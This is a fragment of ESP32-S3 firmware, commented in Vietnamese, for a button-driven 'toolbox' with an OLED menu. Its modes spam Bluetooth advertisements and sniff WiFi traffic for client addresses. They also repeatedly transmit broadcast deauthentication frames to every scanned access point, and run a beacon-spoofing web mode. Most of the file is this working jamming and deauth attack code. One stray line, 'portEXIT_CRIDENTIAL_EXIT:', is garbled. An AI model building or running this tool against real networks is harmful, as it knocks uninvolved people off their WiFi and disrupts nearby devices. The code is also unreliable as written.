void drawUI(int selected, bool running, int tCount) {
  display.clearDisplay();

  display.fillRect(0, 0, 128, 12, SSD1306_WHITE);
  display.setTextSize(1);
  display.setTextColor(SSD1306_BLACK);
  display.setCursor(8, 2);
  display.print(F(" ESP32-S3 TOOLBOX "));

  display.setTextColor(SSD1306_WHITE);

  if (!running) {
    display.setCursor(0, 14);
    display.print(F("CHON CHE DO:"));
    
    display.setCursor(0, 24);
    if (selected == 0) display.print(F("> 1. BT Spam"));
    else               display.print(F("  1. BT Spam"));

    display.setCursor(0, 34);
    if (selected == 1) display.print(F("> 2. WiFi Tool"));
    else               display.print(F("  2. WiFi Tool"));

    display.setCursor(0, 44);
    if (selected == 2) display.print(F("> 3. Web Beacon"));
    else               display.print(F("  3. Web Beacon"));
  } 
  else {
    display.setCursor(0, 16);
    if (selected == 0) {
      display.print(F("RUN: BLUETOOTH SPAM"));
      display.setCursor(0, 30);
      display.print(F("Status: Broadcasting"));
    } else if (selected == 1) {
      display.print(F("RUN: WIFI TOOL"));
      display.setCursor(0, 30);
      display.printf("Targets found: %d", tCount);
    } else {
      display.print(F("RUN: WEB BEACON"));
      display.setCursor(0, 26);
      display.print(F("IP: 192.168.4.1"));
      display.setCursor(0, 38);
      display.printf("State: %s", beaconRunning ? "ACTIVE" : "PAUSED");
    }
  }

  display.drawFastHLine(0, 54, 128, SSD1306_WHITE);
  display.setCursor(2, 55);
  if (!running) {
    display.print(F("< L/R: Doi | OK: Chay >"));
  } else {
    display.print(F("< OK: Dung lai >"));
  }

  display.display();
}

void setup() {
  Serial.begin(115200);
  pinMode(BTN_LEFT, INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  Wire.begin(I2C_SDA, I2C_SCL);
  Wire.setClock(400000); 
  
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("Không tìm thấy màn hình OLED!"));
  }

  // Khởi tạo FreeRTOS Task cho Beacon Spoofer chạy ngầm
  xTaskCreatePinnedToCore(
    beaconTask,          
    "BeaconTask",        
    4096,                
    NULL,                
    1,                   
    &BeaconTaskHandle,   
    0                    
  );
}

void loop() {
  unsigned long currentMillis = millis();

  // Xử lý nút Lên/Trái (Chuyển menu)
  if (digitalRead(BTN_LEFT) == LOW) {
    if (!isRunning && (currentMillis - lastLeftTime > 250)) {
      menuIndex = (menuIndex - 1 + TOTAL_MENUS) % TOTAL_MENUS; 
      lastLeftTime = currentMillis;
    }
  }

  // Xử lý nút Phải (Chuyển menu)
  if (digitalRead(BTN_RIGHT) == LOW) {
    if (!isRunning && (currentMillis - lastRightTime > 250)) {
      menuIndex = (menuIndex + 1) % TOTAL_MENUS; 
      lastRightTime = currentMillis;
    }
  }

  // Xử lý nút Chọn (OK / Start / Stop)
  if (digitalRead(BTN_SELECT) == LOW) {
    if (currentMillis - lastSelectTime > 400) {
      isRunning = !isRunning; 
      if (isRunning) {
        if (menuIndex == 0) initBluetoothMode();
        else if (menuIndex == 1) initWiFiToolMode();
        else if (menuIndex == 2) initWiFiWebBeaconMode();
      } else {
        // Dọn dẹp toàn bộ tài nguyên khi dừng chế độ hiện tại
        esp_wifi_set_promiscuous(false);
        WiFi.scanDelete();
        WiFi.mode(WIFI_OFF);
        NimBLEDevice::deinit(true);
        pAdvertising = nullptr; 
        targetCount = 0;
        isScanningAsync = false;
        beaconRunning = false;
        server.stop();
        Serial.println("[-] Đã dừng hoạt động, về màn hình chính.");
      }
      lastSelectTime = currentMillis;
    }
  }

  // Nếu đang ở chế độ Web Beacon, cần xử lý client truy cập Web liên tục ngay cả khi isRunning = true
  if (isRunning && menuIndex == 2) {
    server.handleClient();
    drawUI(2, true, 0);
    delay(5);
    return;
  }

  if (!isRunning) {
    drawUI(menuIndex, false, 0);
    delay(50);
    return;
  }

  // Mode 0: Bluetooth Spam
  if (menuIndex == 0) {
    if (pAdvertising != nullptr && isRunning) {
      NimBLEAdvertisementData adv1;
      adv1.setManufacturerData(std::string((char*)payload1, sizeof(payload1)));
      pAdvertising->setAdvertisementData(adv1);
      pAdvertising->start();
      delay(30);
      pAdvertising->stop();

      if (!isRunning) return; 

      NimBLEAdvertisementData adv2;
      adv2.setManufacturerData(std::string((char*)payload2, sizeof(payload2)));
      pAdvertising->setAdvertisementData(adv2);
      pAdvertising->start();
      delay(30);
      pAdvertising->stop();
    }
    drawUI(0, true, 0);
  } 
  // Mode 1: WiFi Sniffer & Deauth Tool
  else if (menuIndex == 1) {
    int processLimit = 15; 
    while (processLimit > 0 && isRunning) {
      portENTER_CRITICAL(&bufferMux);
      if (bufTail == bufHead) {
        portEXIT_CRITICAL(&bufferMux);
        break;
      }
      AnalyzedPacket p = packetBuffer[bufTail];
      bufTail = (bufTail + 1) % RING_BUFFER_SIZE;
      portEXIT_CRITICAL(&bufferMux);
      
      portENTER_CRITICAL(&targetMux);
      if (targetCount > 0) {
          for (int i = 0; i < targetCount; i++) {
              if (memcmp(p.addr3, targets[i].bssid, 6) == 0 || memcmp(p.addr1, targets[i].bssid, 6) == 0) {
                  const uint8_t *potentialClient = nullptr;
                  if (memcmp(p.addr1, targets[i].bssid, 6) != 0 && isValidMac(p.addr1)) {
                      potentialClient = p.addr1;
                  } else if (memcmp(p.addr2, targets[i].bssid, 6) != 0 && isValidMac(p.addr2)) {
                      potentialClient = p.addr2;
                  }

                  if (potentialClient != nullptr) {
                      bool exists = false;
                      for (int c = 0; c < targets[i].clientCount; c++) {
                        if (memcmp(targets[i].clients[c], potentialClient, 6) == 0) {
                            exists = true;
                            break;
                        }
                      }
                      if (!exists && targets[i].clientCount < MAX_CLIENTS_PER_TARGET) {
                          memcpy(targets[i].clients[targets[i].clientCount], potentialClient, 6);
                          targets[i].clientCount++;
                      }
                  }
              }
          }
      }
      portEXIT_CRITICAL(&targetMux);
      processLimit--;
    }

    int scanStatus = WiFi.scanComplete();
    if (scanStatus >= 0 && isRunning) {
      int foundCount = (scanStatus > 0) ? scanStatus : 0;
      
      portENTER_CRITICAL(&targetMux);
      memset(targets, 0, sizeof(targets));
      targetCount = (foundCount < MAX_TARGETS) ? foundCount : MAX_TARGETS;
      
      if (targetCount > 0) {
        for (int i = 0; i < targetCount; i++) {
          targets[i].channel = WiFi.channel(i);
          memcpy(targets[i].bssid, WiFi.BSSID(i), 6);
          String ssidStr = WiFi.SSID(i);
          if (ssidStr.length() == 0) ssidStr = "<Hidden>";
          ssidStr.toCharArray(targets[i].ssid, 33);
          targets[i].clientCount = 0;
        }
      }
      portEXIT_CRITICAL(&targetMux);

      WiFi.scanDelete();
      if (isRunning) {
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
      }
      isScanningAsync = false;
    }

    if (!isScanningAsync && targetCount == 0 && isRunning) {
      startAsyncScan();
    }

    portENTER_CRITICAL(&targetMux);
    int currentTargets = targetCount;
    Target localTargets[MAX_TARGETS];
    if (currentTargets > 0) {
      memcpy(localTargets, targets, sizeof(Target) * currentTargets);
    }
    portEXIT_CRIDENTIAL_EXIT:
    portEXIT_CRITICAL(&targetMux);

    if (currentTargets > 0 && !isScanningAsync) {
      for (int t = 0; t < currentTargets; t++) {
        if (!isRunning || menuIndex != 1) break;
        esp_wifi_set_channel(localTargets[t].channel, WIFI_SECOND_CHAN_NONE);
        
        memcpy(&deauthBroadcastPacket[10], localTargets[t].bssid, 6); 
        memcpy(&deauthBroadcastPacket[16], localTargets[t].bssid, 6); 
        
        for (int i = 0; i < BURST_COUNT; i++) {
          if (!isRunning) break; 
          esp_wifi_80211_tx(WIFI_IF_STA, deauthBroadcastPacket, sizeof(deauthBroadcastPacket), false);
          delayMicroseconds(PACKET_DELAY);
        }
      }
    }

    drawUI(1, true, currentTargets);
    yield();
    delay(20);
  }
}
